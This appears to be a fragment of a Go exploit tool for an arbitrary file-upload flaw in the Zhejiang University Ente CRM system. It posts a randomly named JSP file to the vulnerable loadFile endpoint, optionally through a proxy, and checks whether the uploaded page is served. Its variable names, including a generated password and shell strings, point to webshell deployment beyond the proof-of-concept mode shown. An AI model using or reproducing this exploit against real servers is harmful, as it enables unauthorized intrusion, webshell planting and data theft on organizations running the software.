...
var ShellStrs string

func CustomerActionEntPhone(mode, target, proxyAddr string) {
	Password := randstr.Hex(8)
	Filename := randstr.Hex(8) + ".jsp"
	if mode == strings.ToLower("poc") {
		ShellStrs = "浙大恩特CRM系统[/entsoft/CustomerAction.entphone;.js?method=loadFile]文件上传漏洞验证测试"
		...
		urlForShell, err := doUpload(target, Filename, ShellStrs, proxyAddr)
		if err != nil {
			fmt.Println(err)
			os.Exit(0)
		}
	...
	if string(all) == "浙大恩特CRM系统[/entsoft/CustomerAction.entphone;.js?method=loadFile]文件上传漏洞验证测试" {
		fmt.Printf("站点存在此漏洞,Shell页面显示\n%s\n", all)
	}
}

func doUpload(targetHost, filename, ShellContent, proxy string) (shellURL string, err error) {
	vulURL := "/entsoft/CustomerAction.entphone;.js?method=loadFile"
	...
	if result.Filepath != "" {
		shellURL := strings.Replace(targetHost+result.Filepath, "//ent", "/ent", 1)
		return shellURL, nil
	}
